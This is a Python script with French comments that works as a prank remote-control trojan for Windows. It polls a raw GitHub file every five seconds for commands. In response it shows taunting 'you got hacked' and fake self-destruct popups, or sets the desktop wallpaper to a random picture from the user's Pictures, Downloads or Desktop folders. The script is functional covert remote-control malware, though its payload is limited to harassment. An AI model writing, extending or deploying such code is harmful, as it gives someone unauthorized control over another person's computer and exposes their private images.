
import requests
import time
import os
import ctypes
import random
import glob

# URL correcte vers le contenu brut de commande.txt
URL_COMMANDE = "https://raw.githubusercontent.com/panzerdvi/panzerdvi/refs/heads/main/commande.txt"

# Dictionnaire de commandes popup
messages = {
    "popup1": "Tu t’es fait hack fréro",
    "popup2": "Arrête de cliquer n'importe où",
    "popup3": "Ce PC va s’autodétruire dans 5... 4... 3... (ou pas)",
}

def changer_fond_ecran_aleatoire():
    # Dossiers à scanner
    dossiers = [
        os.path.join(os.environ["USERPROFILE"], "Pictures"),
        os.path.join(os.environ["USERPROFILE"], "Downloads"),
        os.path.join(os.environ["USERPROFILE"], "Desktop")
    ]

    extensions = ["*.jpg", "*.jpeg", "*.png", "*.bmp"]
    images = []

    for dossier in dossiers:
        for ext in extensions:
            images.extend(glob.glob(os.path.join(dossier, ext)))

    if images:
        image_choisie = random.choice(images)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_choisie, 3)
        print(f"Fond d’écran changé : {image_choisie}")
    else:
        print("Aucune image trouvée pour changer le fond d’écran.")

while True:
    try:
        # Lecture de la commande
        commande = requests.get(URL_COMMANDE).text.strip().lower().replace(" ", "")
        print("Commande reçue :", commande)

        if commande in messages and commande != "stop":
            os.system(f'msg * "{messages[commande]}"')

        if commande == "wallpaper":
            changer_fond_ecran_aleatoire()

    except Exception as e:
        print("Erreur :", e)

    time.sleep(5)
